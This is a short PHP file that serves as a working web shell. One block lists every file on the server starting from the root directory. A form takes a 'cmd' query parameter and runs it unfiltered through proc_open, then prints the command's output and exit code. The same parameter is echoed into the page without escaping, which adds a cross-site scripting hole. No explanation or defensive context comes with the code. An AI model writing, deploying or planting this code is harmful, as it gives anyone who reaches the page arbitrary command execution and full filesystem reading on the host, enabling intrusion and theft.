<p>All files available from php:<p>
<pre>
<?php

$it = new RecursiveDirectoryIterator("/");

foreach(new RecursiveIteratorIterator($it) as $file) {
    echo $file . "\n";
}

?>
</pre>


<form method="get">
    Command:

    <input type="text" name="cmd" value="<?php echo $_GET["cmd"]?>" width="800"/>
    <button type="submit">Run!</button>
</form>

<pre>
#> <?php echo $_GET["cmd"]?>

<?php 

$proc = proc_open($_GET['cmd'], [ 
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
], $pipes);
fclose($pipes[0]);

echo stream_get_contents($pipes[1]);
fclose($pipes[1]);
echo stream_get_contents($pipes[2]);
fclose($pipes[2]);

$rtn = proc_close($proc); 

echo "\n\n\tExit code: " . $rtn;

?>
</pre>
